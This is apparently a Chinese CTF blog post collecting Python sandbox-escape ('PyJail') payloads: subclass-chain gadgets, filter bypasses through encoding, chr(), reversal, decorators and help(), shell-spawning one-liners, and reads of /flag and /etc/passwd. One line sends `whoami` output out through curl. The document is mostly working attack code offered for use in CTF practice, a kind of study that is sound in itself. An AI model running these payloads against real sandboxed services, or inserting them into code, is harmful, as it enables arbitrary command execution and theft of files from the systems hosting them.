# PyJail姿势总结


对PyJail姿势的总结

<!--more-->

- 在python中，类均继承自`object`基类；
- python中类本身具有一些静态方法，如`bytes.fromhex`、`int.from_bytes`等。

### 魔术方法

```
__init__：构造函数。
__len__：返回对象的长度。对一个对象a使用len(a)时，会尝试调用a.__len__()。
__str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。
__getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。
__add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。

__and__，__or__、__xor__：逻辑运算，和算术运算类似；
__eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如'贵州' > '广西'，就会转而调用'贵州'.__gt__('广西')；

__getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, 'b')。有__getattr__，自然也有对应的__setattr__；

__subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现RCE。
```

### 魔术属性：

```
__dict__：可以查看内部所有属性名和属性值组成的字典。
__doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。
常用__doc__属性来取字符

__class__：返回当前对象所属的类。如''.__class__会返回<class 'str'>。拿到类之后，就可以通过构造函数生成新的对象，如''.__class__(4396)，就等价于str(4396)，即'4396'；

__base__：返回当前类的基类。如str.__base__会返回<class 'object'>；
```

### 内置函数和变量：

```
dir：查看对象的所有属性和方法。
chr、ord：字符与ASCII码转换函数，可以绕WAF
globals：返回所有全局变量的函数；
locals：返回所有局部变量的函数；
__import__：载入模块的函数。import os等价于os = __import__('os')；
__name__：该变量指示当前运行环境位于哪个模块中。
__builtins__：包含当前运行环境中默认的所有函数与类。
__file__：该变量指示当前运行代码所在路径。open(__file__).read()就是读取当前运行的python文件代码。

_：该变量返回上一次运行的python语句结果。
```

### 模块

```python
#os
import os
os.system('dir')
os.popen('dir').read()

#platform
import platform
platform.popen('dir').read()
platform.os.system('dir')

#timeit
import timeit
timeit.timeit("__import__('os').system('dir')")

#sys
from sys import modules
modules['os'].system('sh')
modules['posix'].system('sh')

sys._getframe().f_locals.values()
```

### lambda表达式

```python
__import__('os').system('sh')
__builtins__.__dict__['__import__']('os').system('sh')
(lambda: __import__('os').system('sh'))()
(__builtins__:=__import__('os'))and(lambda:system)()('sh')
```

### reload 重新加载

重新加载模块，绕过删除模块或方法

```python
>>> __builtins__.__dict__['eval']
<built-in function eval>
>>> del __builtins__.__dict__['eval']
>>> __builtins__.__dict__['eval']
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'eval'

>>> reload(__builtins__)
<module '__builtin__' (built-in)>
>>> __builtins__.__dict__['eval']
<built-in function eval>
```

在 Python 3 中，reload() 函数被移动到 importlib 模块中，所以如果要使用 reload() 函数，需要先导入 importlib 模块。

### 恢复 sys.modules

一些过滤中可能将 `sys.modules['os']` 进行修改. 这个时候即使将 os 模块导入进来,也是无法使用的.

```python
sys.modules['os'] = 'not allowed'

del sys.modules['os']
import os
os.system('ls')
```

### rce_payload

```python
__import__('os').system('cat ./flag.txt')
__import__('os').system('sh')
print(open('/flag.txt').read())

#起手式
os.system('sh')
os.popen('ls').read()

#属性/字典
getattr(__import__('os'),'system')('dir')
__import__('os').__getattribute__('system')('dir')
__import__('os').__dict__.__getitem__('system')('dir')

#os._wrap_close类
().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh') 

#object类 - warnings.WarningMessage类
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['system']('ls')
().__class__.__base__.__subclasses__()[137].__init__.__globals__['system']("sh")

#help()函数
help() => os => !sh
help() => __main__
help() => [filename]

#调试器
breakpoint()

#_posixsubprocess.fork_exec
#不同的python版本的_posixsubprocess.fork_exec接受的参数个数不一样
#参考https://ctftime.org/writeup/31883
import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)

#文件读取
open('1.txt').read()

#object类
().__class__.__base__.__subclasses__()[40]("1.txt").read()
().__class__.__bases__[0].__subclasses__()[40]("1.txt").read()
"".__class__.__mro__[-1].__subclasses__()[40]("1.txt").read()
```

### bypass

```python
#字符串拼接
'sys'+'tem' => 'system'
'__imp'+'ort__' => '__import__'
''.join(['__imp','ort__']) => '__import__'


#unicode绕过
相似 unicode 寻找网站：http://shapecatcher.com/
可以通过绘制的方式寻找相似字符


#下划线被过滤
dir()[0] => '_'
也可以使用对应的全角字符进行替换：
＿
第一个字符不能为全角，否则会报错：
>>> print(_＿name_＿)
__main__
>>> print(＿＿name_＿)
  File "<stdin>", line 1
    print(＿＿name_＿)
          ^
SyntaxError: invalid character '＿' (U+FF3F)


#chr()函数构造
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)) => __import__("os")


#bytes 函数
bytes([46, 47, 102, 108, 97, 103]).decode() => './flag'


#编码绕过
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
'X19pbXBvcnRfXw=='.decode('base64')  => '__import__'
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc')


#进制转换
八进制：
exec("print('RCE'); __import__('os').system('ls')")
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
exp：
s = "eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])"
octal_string = "".join([f"\\{oct(ord(c))[2:]}" for c in s])
print(octal_string)


十六进制：
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
exp:
s = "eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))"
octal_string = "".join([f"\\x{hex(ord(c))[2:]}" for c in s])
print(octal_string)


#逆序绕过
'__tropmi__'[::-1] => '__import__'
>>> eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
kali
>>> exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
kali


#替换绕过
'__buihf9ns__'.replace('hf9','ldi') => '__buildins__'


#rot13编码绕过
import codecs
getattr(os,codecs.encode("flfgrz",'rot13'))('ifconfig')


#unicode字符 / Non-ASCII Identifies
# 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳
# 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫


#清空
setattr(__import__("__main__"), "blacklist", list())


#过滤eval
exec("import os;os.system('curl xxx')")


### `__globals__` 替换
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals
''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__("__glo"+"bals__")


### `__mro__`、`__bases__`、`__base__`互换
三者之间可以相互替换
''.__class__.__mro__[2]
[].__class__.__mro__[1]
{}.__class__.__mro__[1]
().__class__.__mro__[1]
[].__class__.__mro__[-1]
{}.__class__.__mro__[-1]
().__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
[].__class__.__base__
().__class__.__base__
{}.__class__.__base__


#过滤运算符
== 用 in 来替换
or 可以用| + -...-来替换
e.g:
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] or i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans)
    print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)
    
and 可以用& *替代
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] and i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} & {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)
    
    
#过滤空格
通过 ()、[] 替换


#过滤()
1.利用装饰器 @
2.利用魔术方法，例如 enum.EnumMeta.__getitem__


#过滤[]
1.调用__getitem__()函数直接替换；
2.调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；
''.__class__.__mro__[-1].__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
# __getitem__()替换中括号[]
''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('ls')
# pop()替换中括号[]，结合__getitem__()利用
''.__class__.__mro__.__getitem__(-1).__subclasses__().pop(200).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('ls')

getattr(''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__,'__builtins__').__getitem__('__import__')('os').system('ls')


#过滤数字
0=False
1=True
2=True+True=True-(-True)
3=True+True+True=True-(-True)-(-True)

也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。
>>> len(repr(True))
4
>>> len(repr(bytearray))
19

可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现
0 -> len([])
2 -> len(list(dict(aa=()))[len([])])
3 -> len(list(dict(aaa=()))[len([])])


#过滤request
#字符串request:
list(globals().keys())[11]
#request值：
globals()[list(globals().keys())[11]]


#过滤引号
chr(123)
str()


#eval + list + dict 绕过内建函数过滤
>>> eval(list(dict(s_t_r=1))[0][::2])
<class 'str'>


 #过滤. 和 ，获取函数
通过点号来进行调用__import__('binascii').a2b_base64
通过 getattr 函数：getattr(__import__('binascii'),'a2b_base64')
 #, 号和 . 都被过滤
1.内建函数可以使用eval(list(dict(s_t_r=1))[0][::2]) 这样的方式获取。
2.模块内的函数可以先使用 __import__ 导入函数，然后使用 vars() j进行获取：
>>> vars(__import__('binascii'))['a2b_base64']
<built-in function a2b_base64>


#__doc__获取字符
__doc__ 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：
().__doc__.find('s')
().__doc__[19]+().__doc__[86]+().__doc__[19]


#盲注
time.sleep(3) if open('/flag').read()[0]=='c' else 1
flag.index('flag{...')
type(flag.split())(type(flag.split())(flag).pop({..}).encode()).remove({..})


#其他技巧
eval(input())
(lambda:os.system('/bin/sh'))()
(__builtins__:=__import__('os'))and(lambda:system)()('sh') #过滤点
setattr(copyright,'__dict__',globals()),delattr(copyright,'breakpoint'),breakpoint()
[*open("flag"+chr(46)+"txt")] #open未过滤，read过滤
raise Exception(flag) #报错外带


#修饰符
@exec
@input
class A:
    pass
```

### python 继承链

```python
# os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")

# subprocess 
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls')

# builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]

# help
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]['help']

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]['__builtins__']

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")

#imp
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")

# ctypes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode())

# multiprocessing
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start()

#file
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd")
```

### 海象运算符

海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。

海象表达式的语法形式如下：

```
<expression> := <value> if <condition> else <value>
```

借助海象表达式，我们可以通过列表来替代多行代码：

```python
>>> eval('[a:=__import__("os"),b:=a.system("id")]')
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[<module 'os' (frozen)>, 0]
```

###  AST 沙箱绕过

装饰器

利用 payload 如下:

```
@exec
@input
class X:
    pass
```

当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.

```
>>> @exec
... @input
... class X:
...     pass
... 
<class '__main__.X'>__import__("os").system("ls")
```

由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.

其实这样的话,构造其实可以有很多,比如直接打开 help 函数.

```
@help
class X:
    pass
```

这样可以直接进入帮助文档:

```
Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)
```

再次输入 !sh 即可打开 /bin/sh

### 参考文档

https://zhuanlan.zhihu.com/p/578966149

https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets

https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGKqita%2BFTQx%3DoD#toc-15

https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1.html

https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals

